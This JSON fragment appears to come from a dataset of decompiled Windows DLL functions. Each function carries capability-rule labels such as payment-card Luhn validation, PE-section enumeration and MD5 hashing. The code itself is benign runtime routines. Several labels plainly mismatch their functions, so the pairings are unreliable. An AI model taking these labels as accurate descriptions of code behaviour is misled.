        "decompiled_code": "\nvoid fcn.180024024(int64_t lpMem)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    \n    if ((lpMem != 0) && (iVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x180049270, 0, lpMem),  iVar2 == 0)) {\n        puVar1 = fcn.180025ba4();\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar4 = fcn.180025b5c(uVar3);\n        *puVar1 = uVar4;\n    }\n    return;\n}\n",
        "token_count": 152
    },
    "18002c33": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002c33c(void)\n\n{\n    code **ppcVar1;\n    \n    for (ppcVar1 = 0x18003ba98; ppcVar1 < 0x18003ba98; ppcVar1 = ppcVar1 + 1) {\n        if (*ppcVar1 != NULL) {\n            (**ppcVar1)();\n        }\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "18002ee1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.18002ee1c(int64_t *arg1)\n\n{\n    if (arg1 != NULL) {\n        if (*arg1 != *0x1800413d0) {\n            fcn.180024024(*arg1);\n        }\n        if (arg1[1] != *0x1800413d8) {\n            fcn.180024024(arg1[1]);\n        }\n        if (arg1[2] != *0x1800413e0) {\n            fcn.180024024(arg1[2]);\n        }\n        if (arg1[0xb] != *0x180041428) {\n            fcn.180024024(arg1[0xb]);\n        }\n        if (arg1[0xc] != *0x180041430) {\n            fcn.180024024(arg1[0xc]);\n        }\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "180031b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.180031b40(uint16_t *arg1, uint16_t *arg2)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint16_t uVar4;\n    int64_t iVar5;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if (*0x180049920 == 0) {\n        if ((arg1 != NULL) && (arg2 != NULL)) {\n            iVar5 = arg1 - arg2;\n            do {\n                uVar1 = *(iVar5 + arg2);\n                if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                    uVar1 = uVar1 + 0x20;\n                }\n                uVar4 = *arg2;\n                if ((0x40 < uVar4) && (uVar4 < 0x5b)) {\n                    uVar4 = uVar4 + 0x20;\n                }\n                arg2 = arg2 + 1;\n            } while ((uVar1 != 0) && (uVar1 == uVar4));\n            return uVar1 - uVar4;\n        }\n        puVar3 = fcn.180025ba4();\n        *puVar3 = 0x16;\n        fcn.180026334();\n        return 0x7fffffff;\n    }\n    fcn.1800241bc(aiStack40, 0);\n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar3 = fcn.180025ba4();\n        *puVar3 = 0x16;\n        fcn.180026334();\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n        iVar2 = 0x7fffffff;\n    }\n    else {\n        if (*(aiStack40[0] + 0x14) == 0) {\n            iVar5 = arg1 - arg2;\n            do {\n                uVar1 = *(iVar5 + arg2);\n                if ((0x40 < uVar1) && (uVar1 < 0x5b)) {\n                    uVar1 = uVar1 + 0x20;\n                }\n                uVar4 = *arg2;\n                if ((0x40 < uVar4) && (uVar4 < 0x5b)) {\n                    uVar4 = uVar4 + 0x20;\n                }\n                arg2 = arg2 + 1;\n            } while ((uVar1 != 0) && (uVar1 == uVar4));\n        }\n        else {\n            do {\n                uVar1 = fcn.180028bdc(*arg1, aiStack40);\n                arg1 = arg1 + 1;\n                uVar4 = fcn.180028bdc(*arg2, aiStack40);\n                arg2 = arg2 + 1;\n                if (uVar1 == 0) break;\n            } while (uVar1 == uVar4);\n        }\n        iVar2 = uVar1 - uVar4;\n        if (cStack16 != '\\0') {\n            *(iStack24 + 200) = *(iStack24 + 200) & 0xfffffffd;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 747
    },
    "18003236": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.180032360(int64_t arg1, int64_t arg2, int64_t arg3)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    \n    if (arg1 == 0) {\n        fcn.18002d414();\n    }\n    uVar1 = *(arg1 + 0x14);\n    if (*(arg1 + 0x18) + *(arg2 + 8) == 0) {\n        fcn.18002d414();\n    }\n    uVar3 = 0;\n    if (uVar1 != 0) {\n        iVar2 = *(arg2 + 8);\n        piVar4 = iVar2 + *(arg1 + 0x18);\n        do {\n            if (arg3 < *piVar4 + iVar2) break;\n            uVar3 = uVar3 + 1;\n            piVar4 = piVar4 + 2;\n        } while (uVar3 < uVar1);\n        if (uVar3 != 0) {\n            return *(*(arg1 + 0x18) + (uVar3 - 1) * 8 + 4 + iVar2);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 285
    },
    "180007ae": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "hash data with MD5"
        ],
        "decompiled_code": "\nvoid fcn.180007ae0(ulong arg1, uint *arg2)\n\n{\n    arg2[5] = 0;\n    arg2[4] = 0;\n    *arg2 = 0x67452301;\n    arg2[1] = 0xefcdab89;\n    arg2[2] = 0x98badcfe;\n    arg2[3] = 0x10325476;\n    return;\n}\n",
        "token_count": 99
    },
    "18001d4e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.18001d4e0(ulong *arg1)\n\n{\n    return *arg1;\n}\n",
        "token_count": 25
    },
    "18002375": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.180023750(ulong arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    char *apcStackX16 [3];\n    code *apcStack40 [4];\n    \n    do {\n        iVar3 = fcn.180024064(arg1);\n        if (iVar3 != 0) {\n            return;\n        }\n        iVar2 = fcn.180026008(arg1);\n    } while (iVar2 != 0);\n    if ((*0x180048cb8 & 1) == 0) {\n        *0x180048cb8 = *0x180048cb8 | 1;\n        apcStackX16[0] = \"bad allocation\";\n        fcn.1800239a8(0x180048ca0, apcStackX16);\n        *0x180048ca0 = vtable.std::bad_alloc.0;\n        fcn.180024f84(0x180035148);\n    }\n    fcn.180023b1c(apcStack40);\n    apcStack40[0] = vtable.std::bad_alloc.0;\n    fcn.180025954(apcStack40, 0x18003e970);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 293
    },
    "1800323e": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.1800323ec(int64_t arg1, int64_t *arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    iVar3 = *arg2;\n    if (arg1 == 0) {\n        fcn.18002d414();\n    }\n    uVar1 = *(arg1 + 0x14);\n    if (*(arg1 + 0x18) + arg2[1] == 0) {\n        fcn.18002d414();\n    }\n    uVar4 = 0;\n    if (uVar1 != 0) {\n        iVar2 = arg2[1];\n        piVar5 = iVar2 + *(arg1 + 0x18);\n        do {\n            if (iVar3 < *piVar5 + iVar2) break;\n            uVar4 = uVar4 + 1;\n            piVar5 = piVar5 + 2;\n        } while (uVar4 < uVar1);\n        if (uVar4 != 0) {\n            return *(*(arg1 + 0x18) + (uVar4 - 1) * 8 + 4 + iVar2);\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 292
    }
}